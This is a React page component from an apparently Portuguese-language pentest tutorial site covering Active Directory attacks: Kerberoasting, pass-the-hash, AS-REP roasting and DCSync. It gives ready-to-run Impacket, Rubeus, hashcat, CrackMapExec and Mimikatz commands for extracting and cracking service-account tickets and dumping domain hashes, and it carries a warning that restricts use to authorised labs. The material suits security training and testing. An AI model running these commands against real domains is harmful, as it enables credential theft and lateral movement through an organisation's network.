import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function Kerberoasting() {
    return (
      <PageContainer
        title="Kerberoasting & Pass-the-Hash"
        subtitle="Técnicas de ataque ao Active Directory para obter e usar credenciais de contas de serviço."
        difficulty="avancado"
        timeToRead="14 min"
      >
        <AlertBox type="danger" title="Uso exclusivo em labs AD autorizados">
          Ataques a Active Directory real sem autorização são crimes sérios.
        </AlertBox>

        <h2>Kerberoasting — O que é?</h2>
        <p>
          Contas de serviço no AD têm um SPN (Service Principal Name) registrado.
          Qualquer usuário autenticado pode solicitar um TGS (ticket de serviço) para essas contas.
          O TGS é criptografado com o hash da senha da conta de serviço — que pode ser quebrado offline!
        </p>

        <h2>Kerberoasting com Impacket</h2>
        <CodeBlock language="bash" code={'# GetUserSPNs — encontrar e extrair tickets\nimpacket-GetUserSPNs DOMINIO.local/usuario:senha -dc-ip IP_DC\n\n# Extrair tickets para quebrar\nimpacket-GetUserSPNs DOMINIO.local/usuario:senha -dc-ip IP_DC -request\nimpacket-GetUserSPNs DOMINIO.local/usuario:senha -dc-ip IP_DC -request -outputfile kerberoast.txt\n\n# Quebrar com Hashcat\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\n\n# Quebrar com John\njohn --format=krb5tgs kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt'} />

        <h2>Kerberoasting com Rubeus (Windows)</h2>
        <CodeBlock language="bash" code={'# No Windows (membro do domínio):\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n\n# Apenas usuários com senha fraca (RC4)\n.\\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\n\n# Contra usuário específico\n.\\Rubeus.exe kerberoast /user:sqlservice /outfile:hashes.txt'} />

        <h2>Pass-the-Hash (PtH)</h2>
        <CodeBlock language="bash" code={'# PtH: autenticar com o hash NTLM sem precisar da senha em texto\n# Requer hash NT (segundo campo do dumped credentials)\n\n# Com Impacket — psexec\nimpacket-psexec -hashes :HASH_NT DOMINIO/Admin@192.168.1.10\n\n# wmiexec\nimpacket-wmiexec -hashes :HASH_NT DOMINIO/Admin@192.168.1.10\n\n# smbexec\nimpacket-smbexec -hashes :HASH_NT DOMINIO/Admin@192.168.1.10\n\n# Acessar compartilhamento SMB\nsmbclient //192.168.1.10/C\$ -U DOMINIO/Admin --pw-nt-hash HASH_NT\n\n# Com CrackMapExec\ncrackmapexec smb 192.168.1.0/24 -u Admin -H HASH_NT --local-auth'} />

        <h2>AS-REP Roasting</h2>
        <CodeBlock language="bash" code={'# Usuários sem pre-autenticação Kerberos → vulneráveis\n# Não precisa de credenciais para requisitar!\n\nimpacket-GetNPUsers DOMINIO.local/ -usersfile users.txt -dc-ip IP_DC\nimpacket-GetNPUsers DOMINIO.local/ -usersfile users.txt -dc-ip IP_DC -request -outputfile asrep.txt\n\n# Quebrar\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt'} />

        <h2>DCSync — Replicar o AD</h2>
        <CodeBlock language="bash" code={'# Se você tem direitos DCSync (Replication rights):\nimpacket-secretsdump DOMINIO.local/Admin:senha@IP_DC\n\n# Extrair apenas o hash do Administrator\nimpacket-secretsdump DOMINIO.local/Admin:senha@IP_DC -just-dc-user Administrator\n\n# Com Mimikatz (Windows)\nlsadump::dcsync /user:krbtgt\nlsadump::dcsync /all /csv'} />

        <AlertBox type="success" title="CrackMapExec — tudo em um">
          CrackMapExec (CME) combina PtH, execução de comandos, enumeração de domínio e muito mais.
          É o canivete suíço do pentest Active Directory moderno.
        </AlertBox>
      </PageContainer>
    );
  }
  